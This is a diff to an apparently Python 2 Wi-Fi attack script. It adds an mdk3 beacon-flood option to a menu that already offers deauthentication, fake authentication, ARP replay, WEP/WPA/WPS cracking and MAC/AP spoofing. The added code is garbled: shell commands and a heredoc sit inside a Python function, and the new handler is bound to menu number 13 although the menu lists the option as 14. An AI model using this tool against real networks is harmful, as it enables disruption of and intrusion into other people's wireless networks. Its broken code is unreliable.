@@ -277,6 +277,10 @@ def apspoof():
    print spoofinap
    os.system ("gnome-terminal -x "+spoofinap+" &")
    
+def beaconflood():
+   echo "type a bucket of random ssid names on eachline then add a line that says EOF to close it off"
+   cat << EOF > beacon.lst
+   mdk3 mon0 b -f beacon.lst
 #==========================qr==========================D
 
 
@@ -308,7 +312,7 @@ listen()
 
 cont = "n"
 while (cont == "n"): 
-	listen_selection = raw_input("\n 0  Change Target\n 1  Fake-auth(FAST)\n 2  ARP Replay\n 3  Deauth Someone\n 4  Frag Attack\n 5  WEP crack\n 6  WPA PSK Crack\n 7  Print Pass\n 8  Deauth like a mofo\n 9  Connect\n 10 WPS Cracking\n 11 Spoof Mac\n 12 Spoof AP\n 13 Handshake Bookaki\n q  Quit\n\nplease pick a number: ")
+	listen_selection = raw_input("\n 0  Change Target\n 1  Fake-auth(FAST)\n 2  ARP Replay\n 3  Deauth Someone\n 4  Frag Attack\n 5  WEP crack\n 6  WPA PSK Crack\n 7  Print Pass\n 8  Deauth like a mofo\n 9  Connect\n 10 WPS Cracking\n 11 Spoof Mac\n 12 Spoof AP\n 13 Handshake Bookaki\n 14 Beacon Flood\n q  Quit\n\nplease pick a number: ")
 	if listen_selection == "0":
 		scan()
 		# input target prefs
@@ -354,6 +358,8 @@ while (cont == "n"):
 	elif listen_selection =="12":
 		spoofap = raw_input("AP ESSID: ")
 		apspoof()
+	elif listen_selection == "13":
+		beaconflood()
 	elif listen_selection == "quickie":
 		print "performing quickie... skeet skeet"
 		fakeauth()
